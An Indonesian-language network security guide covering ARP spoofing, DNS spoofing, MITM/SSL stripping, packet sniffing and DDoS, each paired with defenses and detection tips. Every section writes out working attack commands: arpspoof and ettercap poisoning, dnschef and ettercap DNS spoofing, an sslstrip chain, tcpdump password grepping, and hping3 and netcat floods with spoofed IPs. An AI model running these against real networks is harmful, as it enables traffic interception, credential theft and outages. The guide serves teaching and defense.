üéØ ARP Spoofing / ARP Poisoning

Ancaman: HIGH

ARP (Address Resolution Protocol) spoofing adalah teknik untuk mengirim gratuitous ARP requests dengan MAC address yang palsu, sehingga mengarahkan traffic ke attacker.

Bagaimana Cara Kerjanya:

  • Attacker mengirim fake ARP reply ke target
  • Target memetakan IP address ke MAC address attacker
  • Traffic diinterseptasi oleh attacker
  • Bisa mengakses unencrypted data (passwords, credentials)

    • Perintah Menggunakan Arpspoof (dari Dsniff):

    # Intercept traffic antara gateway & target arpspoof -i eth0 -t [TARGET_IP] [GATEWAY_IP] # Jalankan di terminal lain untuk intercept balik arpspoof -i eth0 -t [GATEWAY_IP] [TARGET_IP] # Enable IP forwarding untuk MITM echo 1 > /proc/sys/net/ipv4/ip_forward

    Menggunakan Ettercap:

    # Interactive mode ettercap -G # Command line dengan target specific ettercap -T -q -i eth0 -M arp:remote /TARGET1_IP/ /TARGET2_IP/ # Hanya sniffing tanpa MITM ettercap -T -q -i eth0 /TARGET_IP/

    ‚õî Proteksi & Deteksi

  • Static ARP Entries: Configure static ARP untuk critical devices
  • ARP Monitoring: Gunakan tools seperti Snort/Suricata untuk alert
  • DHCP Snooping: Cegah ARP replies dari non-authorized sources
  • Port Security: Limit MAC addresses per port di switch
  • VPN/SSL: Encrypt traffic untuk mencegah sniffing
  • ARP Guard: Deploy dedicated ARP monitoring tools

    • Deteksi dengan Wireshark:

    # Filter untuk melihat ARP requests arp # Alert jika MAC mapping berubah arp.duplicate-address-detected # Monitor semua ARP activity arp && (arp.opcode == 1 or arp.opcode == 2)

    üîó DNS Spoofing & DNS Hijacking

    Ancaman: HIGH

    DNS spoofing mengarahkan DNS queries ke IP address palsu, memaksa users untuk visit malicious website.

    Attack Vectors:

  • DNS cache poisoning - corrupt resolver cache
  • Redirect DNS queries ke malicious DNS server
  • Man-in-the-middle DNS interception
  • Rebinding attacks - make browser connect ke internal IPs

    • Melakukan DNS Spoofing dengan Ettercap:

    # 1. Edit DNS filter file nano /etc/ettercap/etter.dns # Tambahkan mapping: example.com A 192.168.1.100 *.example.com A 192.168.1.100 # 2. Jalankan ettercap dengan DNS plugin ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /TARGET_IP/ /GATEWAY_IP/

    Menggunakan dnschef (untuk DNS response modification):

    # Basic DNS spoofing dnschef -i 0.0.0.0 -c "A=192.168.1.100" # Spoof specific domains dnschef -i 0.0.0.0 --fakeip 192.168.1.100 -d example.com # Dengan iptables redirect iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53

    ‚õî Proteksi & Deteksi

  • DNSSEC: Cryptographic signing dari DNS records
  • DNS Monitoring: Alert pada unusual DNS queries
  • Trusted DNS Server: Use corporate DNS dengan security controls
  • HTTPS Only: Certificate pinning untuk critical sites
  • DNS Query Logging: Monitor dan analyze DNS patterns
  • Update Hosts File: Add critical mappings ke local hosts

    • Deteksi Anomali DNS dengan Zeek:

    # Monitor DNS queries dalam logs zeek -r capture.pcap dns # Lookfor unusual domains zeek -r capture.pcap policy/protocols/dns/dns-query-count.zeek

    üîÑ Man-in-the-Middle (MITM) Attacks

    Ancaman: CRITICAL

    Attacker memposisikan dirinya di antara dua communicating parties untuk intercept & modify traffic.

    Jenis-jenis MITM Attacks:

  • ARP Spoofing: Poisoning ARP tables
  • DNS Hijacking: Redirect ke malicious sites
  • SSL Stripping: Downgrade HTTPS ke HTTP
  • Rogue WiFi Access Point: Create fake WiFi hotspot
  • BGP Hijacking: Redirect internet traffic di level routing

    • SSL Stripping Attack (sslstrip):

    # 1. Setup MITM dengan ARP spoofing arpspoof -i eth0 -t [TARGET] [GATEWAY] # 2. Enable IP forwarding echo 1 > /proc/sys/net/ipv4/ip_forward # 3. Redirect HTTP traffic ke sslstrip iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8888 # 4. Jalankan sslstrip sslstrip -p # SSL traffic akan di-downgrade ke HTTP

    ‚õî Proteksi & Deteksi

  • HSTS (HTTP Strict Transport Security): Force HTTPS
  • Certificate Pinning: Lock ke specific certificate
  • VPN/TLS: Encrypt semua communication
  • Network Segmentation: Isolate sensitive systems
  • MAC Filtering: Only known devices on network
  • Monitor ARP Tables: Alert pada unexpected changes
  • 802.1X Authentication: Port-based network access control

    • üì¶ Packet Sniffing & Network Eavesdropping

    Ancaman: HIGH

    Mengcapture network traffic untuk extract sensitive information seperti passwords, tokens, atau data.

    Menggunakan Wireshark (GUI):

    # Install wireshark sudo apt install wireshark # Jalankan wireshark # Atau capture langsung ke file sudo wireshark -k -i eth0 -w capture.pcap

    Menggunakan tcpdump (Command Line):

    # Capture semua traffic sudo tcpdump -i eth0 -w capture.pcap # Filter untuk HTTP traffic sudo tcpdump -i eth0 'tcp port 80' -w http.pcap # Capture passwords dalam clear text sudo tcpdump -i eth0 -A 'tcp port 21 or tcp port 23 or tcp port 80' | grep -i pass # Monitor HTTPS SNI (server names) sudo tcpdump -i eth0 -A 'tcp port 443' | grep -oP '(?<=SNI=)[^,]+'

    Sensitive Data dalam Network Traffic:

    Protocol Port Encryption Risk
    HTTP 80 None Critical - All data visible
    FTP 21 None Critical - Credentials visible
    Telnet 23 None Critical - Everything visible
    SMTP (unencrypted) 25/587 Optional High - Email content visible
    HTTPS 443 TLS/SSL Low - Encrypted

    ‚õî Proteksi & Deteksi

  • Network Segmentation: Divide networks untuk limit sniffing
  • Switched Networks: Use switches bukannya hubs
  • Encryption: TLS/SSL untuk semua sensitive data
  • VPN: Encrypt all traffic end-to-end
  • Network IDS: Suricata/Snort untuk detect suspicious patterns
  • IPS (Intrusion Prevention): Active blocking dari malicious traffic
  • Monitor Network Interfaces: Alert jika device dalam promiscuous mode

    • üí• DDoS (Distributed Denial of Service)

    Ancaman: CRITICAL

    Overload target dengan traffic untuk membuat service unavailable.

    Jenis-jenis DDoS:

  • Volumetric: Overwhelming bandwidth (UDP floods, ICMP floods)
  • Protocol: Exploit protocol weaknesses (SYN floods, Ping of Death)
  • Application: Target aplikasi layer (HTTP floods, DNS amplification)

    • SYN Flood Attack:

    # Using hping3 untuk generate SYN packets hping3 -S --flood -p 80 [TARGET_IP] # Spoofed source IP hping3 -S -p 80 --spoof [SPOOFED_IP] --flood [TARGET_IP]

    UDP Flood:

    # Using hping3 untuk UDP flood hping3 -2 --flood -p 53 [TARGET_IP] # Using netcat nc -u -l 0.0.0.0 53 < /dev/zero | nc -u [TARGET_IP] 53

    ‚õî Proteksi & Deteksi

  • DDoS Mitigation Service: Cloudflare, Akamai, AWS Shield
  • Rate Limiting: Limit requests per IP/second
  • Firewalls: Block suspicious traffic patterns
  • Load Balancing: Distribute traffic across servers
  • IDS/IPS: Detect & block attack signatures
  • BGP Flowspec: Remote triggered black hole routing
  • Traffic Scrubbing: Clean traffic di upstream
